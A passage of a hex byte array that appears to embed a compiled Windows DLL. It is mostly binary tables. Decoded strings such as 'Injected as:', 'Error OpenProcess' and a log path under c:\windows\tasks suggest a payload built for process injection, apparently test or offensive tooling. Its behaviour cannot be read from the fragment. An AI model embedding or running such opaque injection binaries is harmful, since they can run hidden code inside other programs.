0x00, 0x00, 0x00,	0x62, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x73, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xE6, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x1C, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x74, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xC4, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x0A, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0x75, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x9A, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xD0, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x76, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x36, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x06, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x6F, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x44, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x5E, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0x6F, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xBA, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xEC, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x70, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x4C, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x90, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xEA, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xD4, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xA2, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x8A, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0x76, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x0C, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xBC, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x7B, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x62, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xEC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x56, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x30, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x7A, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8C, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xA6, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xC8, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6C, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x18, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x79, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x60, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x66, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x28, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xE4, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xDA, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD0, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xC4, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xBA, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xA6, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x9C, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x94, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x8C, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x0A, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3A, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x32, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3E, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xD4, 0x43, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0xD4, 0x43, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0xC0, 0x4B, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0xE0, 0x4B, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0xE0, 0x4B, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x10, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x8C, 0x3C, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,	0xFF, 0xFF, 0xFF, 0xFF, 0x30, 0x83, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0xD0, 0x83, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x78, 0x5D, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0xE0, 0x10, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0xC0, 0x10, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x50, 0x5D, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0xE0, 0x10, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0xC0, 0x10, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x62, 0x61, 0x64, 0x20,	0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00,	0x28, 0x5D, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0xE0, 0x10, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0xC0, 0x10, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x55, 0x6E, 0x6B, 0x6E, 0x6F, 0x77, 0x6E, 0x20, 0x65, 0x78, 0x63, 0x65,	0x70, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x62, 0x61, 0x64, 0x20, 0x61, 0x72, 0x72, 0x61, 0x79, 0x20, 0x6E, 0x65,	0x77, 0x20, 0x6C, 0x65, 0x6E, 0x67, 0x74, 0x68, 0x00, 0x00, 0x00, 0x00,	0x73, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x74, 0x6F, 0x6F, 0x20, 0x6C,	0x6F, 0x6E, 0x67, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x62, 0x61, 0x64, 0x20, 0x63, 0x61, 0x73, 0x74, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x47, 0x65,	0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x42, 0x61, 0x73, 0x65, 0x4E,	0x61, 0x6D, 0x65, 0x41, 0x20, 0x3A, 0x20, 0x25, 0x6C, 0x75, 0x00, 0x00,	0x45, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72,	0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x3A, 0x20, 0x25, 0x6C, 0x75, 0x00,	0x63, 0x3A, 0x5C, 0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C, 0x74,	0x61, 0x73, 0x6B, 0x73, 0x5C, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x78, 0x74,	0x00, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x50, 0x72, 0x6F, 0x63,	0x65, 0x73, 0x73, 0x3A, 0x20, 0x00, 0x00, 0x00, 0x50, 0x49, 0x44, 0x3A,	0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x6E, 0x6A, 0x65,	0x63, 0x74, 0x65, 0x64, 0x20, 0x61, 0x73, 0x3A, 0x20, 0x00, 0x00, 0x00,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23,	0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x23, 0x0A,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x00, 0x00, 0x00,	0xA0, 0x5D, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0xF4, 0x3B, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0xC8, 0x5D, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x70, 0x2D, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x60, 0x2B, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x40, 0x2B, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0xA0, 0x29, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0xC0, 0x28, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x46, 0x3C, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x50, 0x28, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x80, 0x25, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x20, 0x24, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x40, 0x23, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x30, 0x22, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x50, 0x21, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x50, 0x20, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0xB0, 0x1F, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x00, 0x5D, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0xE0, 0x10, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0xC0, 0x10, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFC, 0xBE, 0x91, 0x60, 0x00, 0x00, 0x00, 0x00,	0x02, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 0xEC, 0x5D, 0x00, 0x00,	0xEC, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFC, 0xBE, 0x91, 0x60,	0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,	0x48, 0x5E, 0x00, 0x00, 0x48, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFC, 0xBE, 0x91, 0x60, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00,	0xB8, 0x02, 0x00, 0x00, 0x5C, 0x5E, 0x00, 0x00, 0x5C, 0x52, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFC, 0xBE, 0x91, 0x60, 0x00, 0x00, 0x00, 0x00,	0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x38, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x80, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x53, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x50, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x53, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x58, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x60, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x28, 0x83, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x38, 0x80, 0x00, 0x00, 0x28, 0x58, 0x00, 0x00,	0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x40, 0x58, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x58, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x38, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,	0x28, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xA0, 0x59, 0x00, 0x00, 0x18, 0x5A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xC8, 0x59, 0x00, 0x00, 0xF0, 0x59, 0x00, 0x00,	0x18, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xF0, 0x59, 0x00, 0x00, 0x18, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x18, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x40, 0x5A, 0x00, 0x00, 0xE0, 0x5A, 0x00, 0x00,	0xB8, 0x5A, 0x00, 0x00, 0x90, 0x5A, 0x00, 0x00, 0x68, 0x5A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xE0, 0x5A, 0x00, 0x00, 0xB8, 0x5A, 0x00, 0x00,	0x90, 0x5A, 0x00, 0x00, 0x68, 0x5A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x5B, 0x00, 0x00,	0x58, 0x5B, 0x00, 0x00, 0x30, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x58, 0x5B, 0x00, 0x00, 0x30, 0x5B, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x80, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x5B, 0x00, 0x00,	0xD0, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD0, 0x5B, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x58, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,	0xF8, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xD0, 0x80, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,	0x40, 0x00, 0x00, 0x00, 0x10, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x80, 0x00, 0x00,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x28, 0x5C, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x80, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,	0x40, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xE0, 0x81, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,	0x40, 0x00, 0x00, 0x00, 0xB8, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x81, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x04, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x88, 0x5C, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x48, 0x81, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,	0x70, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x98, 0x81, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,	0x50, 0x00, 0x00, 0x00, 0xA0, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00, 0x00,	0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x58, 0x5C, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x98, 0x81, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,	0xA0, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x70, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x08, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,	0x40, 0x00, 0x00, 0x00, 0x88, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x81, 0x00, 0x00,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x70, 0x5C, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x70, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,	0x88, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x80, 0x82, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,	0x40, 0x00, 0x00, 0x00, 0xE8, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x82, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0xD0, 0x5C, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0x78, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,	0x90, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0xB0, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0xC8, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,	0x08, 0x59, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 